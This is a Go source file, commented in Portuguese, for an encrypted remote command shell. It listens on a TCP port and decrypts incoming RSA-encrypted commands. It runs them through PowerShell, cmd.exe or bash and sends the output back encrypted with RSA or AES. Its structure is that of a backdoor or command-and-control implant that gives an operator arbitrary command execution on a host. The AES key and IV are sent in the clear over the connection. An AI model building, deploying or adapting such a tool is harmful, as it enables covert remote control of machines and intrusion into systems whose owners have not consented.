package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	_ "embed"
	"encoding/gob"
	"encoding/pem"
	"flag"
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
)

//go:embed keys\\listener_private_key.pem
var privateKeyPEM []byte

//go:embed keys\\server_public_key.pem
var publicKeyPEM []byte

func main() {
	portPtr := flag.String("port", "", "server port")
	flag.Parse()
	//privateKeyPEM, err := os.ReadFile("E:\\keys\\listener_private_key.pem")
	terminal := "powershell.exe"
	argument := "-c"
	var clientExecutedMap = make(map[string]bool)
	key := make([]byte, 32)
	rand.Read(key)
	iv := make([]byte, 16)
	rand.Read(iv)
	//var key_out chan rune = make(chan rune)
	//var window_out chan string = make(chan string)
	//publicKeyPEM, err := os.ReadFile("E:\\keys\\server_public_key.pem")
	block, _ := pem.Decode(publicKeyPEM)
	publicKey, _ := x509.ParsePKIXPublicKey(block.Bytes)
	rsaPublicKey, _ := publicKey.(*rsa.PublicKey)

	privateKeyBlock, _ := pem.Decode(privateKeyPEM)
	privateKey, _ := x509.ParsePKCS8PrivateKey(privateKeyBlock.Bytes)
	rsaPrivateKey := privateKey.(*rsa.PrivateKey)
	operacional := runtime.GOOS

	listener, err := net.Listen("tcp", "127.0.0.1:"+*portPtr)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer listener.Close()

	for {
		conn, err := listener.Accept()

		if err != nil {
			fmt.Println(err)
			continue
		}
		clientAddr := conn.RemoteAddr().String()

		// Check if the cliente function has already been executed for this client
		if !clientExecutedMap[clientAddr] {
			go deploy(key, iv, conn) // Run the cliente function in a goroutine
			clientExecutedMap[clientAddr] = true
		}
		go func(conn net.Conn, key []byte, iv []byte) {
			//defer conn.Close()
			decoder := gob.NewDecoder(conn)
			//tty, err := tty.Open()
			encoder := gob.NewEncoder(conn)

			for {
				var encryptedMessage []byte
				err = decoder.Decode(&encryptedMessage)
				if err != nil {
					fmt.Println(err)
					return
				}

				decryptedMessage, err := rsa.DecryptPKCS1v15(nil, rsaPrivateKey, encryptedMessage)
				if err != nil {
					fmt.Println(err)
					return
				}

				//fmt.Printf("Mensagem recebida: %s\n", string(decryptedMessage))

				command := strings.TrimRight(string(decryptedMessage), "\r\n")

				// Usando a biblioteca go-tty para executar o comando e capturar a saída
				if err != nil {
					fmt.Println(err)
					return
				}
				//defer tty.Close()

				var output []byte
				if command == "/os" {
					// Verificar o sistema operacional atual
					operacional := runtime.GOOS
					output = []byte(operacional)
					output = AesWorker(output, key, iv)
					err = encoder.Encode(output)
					//err = encoder.Encode([]byte(operacional))
					if err != nil {
						fmt.Println(err)
						return
					}
				}
				if command == "/cmd" {
					terminal = "cmd.exe"
					argument = "/C"

				}
				if command == "/psh" {
					terminal = "powershell.exe"
					argument = "-c"
				}
				if operacional == "windows" {
					cmd := exec.Command(terminal, argument, command)
					cmd.Stdin = os.Stdin
					output, err = cmd.Output()

				} else {
					cmd := exec.Command("bash", "-c", command)
					cmd.Stdin = os.Stdin
					output, err = cmd.Output()
					if err != nil {
						fmt.Println(err)
						return
					}
				}

				if strings.HasPrefix(command, "cd ") {
					newDir := strings.TrimPrefix(command, "cd ")
					err := os.Chdir(newDir)
					path, _ := os.Getwd()
					output = []byte("path: " + path)
					if err != nil {
						fmt.Println(err)
						return
					}
				}

				encoder := gob.NewEncoder(conn)

				// Enviar a saída de volta para o cliente

				if len(output) >= 1300 {
					output = AesWorker(output, key, iv)
					err = encoder.Encode(output)
				} else {
					fmt.Println(output)
					output, _ = rsa.EncryptPKCS1v15(rand.Reader, rsaPublicKey, output)
					err = encoder.Encode(output)
				}

			} //ciphertext, err := rsa.EncryptPKCS1v15(rand.Reader, rsaPublicKey, output)

		}(conn, key, iv)
	}
}
func AesWorker(output []byte, key []byte, iv []byte) []byte {

	block, _ := aes.NewCipher(key)

	// Verificar se o tamanho da saída é um múltiplo do tamanho do bloco
	if len(output)%block.BlockSize() != 0 {
		// Adicionar padding para tornar o tamanho múltiplo de 16
		padding := block.BlockSize() - (len(output) % block.BlockSize())
		for i := 0; i < padding; i++ {
			output = append(output, 0)
		}
	}

	cbc := cipher.NewCBCEncrypter(block, iv)
	cbc.CryptBlocks(output, output)
	return output
}
func deploy(key []byte, iv []byte, conn net.Conn) {
	encoder := gob.NewEncoder(conn)

	// Crie uma estrutura ou um mapa para armazenar key e iv

	// Encode a estrutura ou o mapa
	encoder.Encode(key)
	encoder.Encode(iv)

}
